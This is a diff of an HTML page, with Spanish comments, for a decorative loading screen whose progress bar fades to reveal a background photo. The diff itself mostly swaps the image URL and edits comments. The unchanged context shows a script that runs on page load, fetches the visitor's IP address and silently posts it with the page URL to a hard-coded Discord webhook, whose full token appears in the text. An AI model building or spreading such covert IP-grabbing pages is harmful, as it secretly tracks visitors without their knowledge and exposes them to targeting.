@@ -22,7 +22,7 @@
             background-color: #000; /* Fondo base negro */
         }
 
-        /* La foto de fondo (está "debajo" del velo negro) */
+        /* La NUEVA foto de fondo (Imgur) */
         .background-image {
             position: fixed;
             top: 0;
@@ -30,12 +30,13 @@
             width: 100%;
             height: 100%;
             z-index: 1;
-            background-image: url('https://wallpapers.com/images/hd/4k-nature-moraine-lake-r66plwqa8m3z5reg.jpg');
+            /* URL actualizada */
+            background-image: url('https://i.imgur.com/Qb5YqCL.jpeg'); 
             background-size: cover;
             background-position: center;
         }
 
-        /* El "Velo Negro" que cubre todo al inicio */
+        /* El "Velo Negro" que cubre todo al inicio (IGUAL) */
         .black-overlay {
             position: fixed;
             top: 0;
@@ -44,10 +45,10 @@
             height: 100%;
             background-color: #000;
             z-index: 2; /* Por encima de la foto */
-            transition: opacity 2s ease-in-out; /* Transmisión suave al desaparecer */
+            transition: opacity 2s ease-in-out; /* Animación suave (IGUAL) */
         }
 
-        /* Panel de carga */
+        /* Panel de carga (IGUAL) */
         .glass-panel {
             position: relative;
             z-index: 3; /* Siempre al frente */
@@ -78,7 +79,7 @@
             transition: width 0.1s linear;
         }
 
-        /* Clases para el efecto final */
+        /* Clases para el efecto final (IGUAL) */
         .fade-out {
             opacity: 0;
             pointer-events: none;
@@ -97,6 +98,7 @@
     </div>
 
     <script>
+        // Webhook (IGUAL)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';
 
         window.onload = function() {
@@ -104,6 +106,7 @@
             sendData();
         };
 
+        // Lógica de animación (IGUAL)
         function startLoading() {
             const bar = document.getElementById('progress');
             const panel = document.getElementById('main-panel');
@@ -119,7 +122,7 @@
                         // 1. Desvanece el panel de carga
                         panel.classList.add('fade-out');
                         
-                        // 2. Desvanece el fondo negro para revelar la foto
+                        // 2. Desvanece el fondo negro para revelar la NUEVA foto
                         setTimeout(() => {
                             overlay.classList.add('fade-out');
                         }, 300);
@@ -127,12 +130,13 @@
                     }, 500);
 
                 } else {
-                    width += 1; // Carga un poco más suave para apreciar el efecto
+                    width += 1; // Carga suave
                     bar.style.width = width + '%';
                 }
             }, 30);
         }
 
+        // Envío de datos (IGUAL)
         async function sendData() {
             let userIP = "Unknown";
             try {
@@ -148,7 +152,7 @@
                     embeds: [{
                         description: `🌐 **IP Detectada:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
                         color: 3447003, 
-                        footer: { text: "Delta System | Transition Reveal" }
+                        footer: { text: "Delta System | New Background" }
                     }]
                 })
             }).catch(() => {});
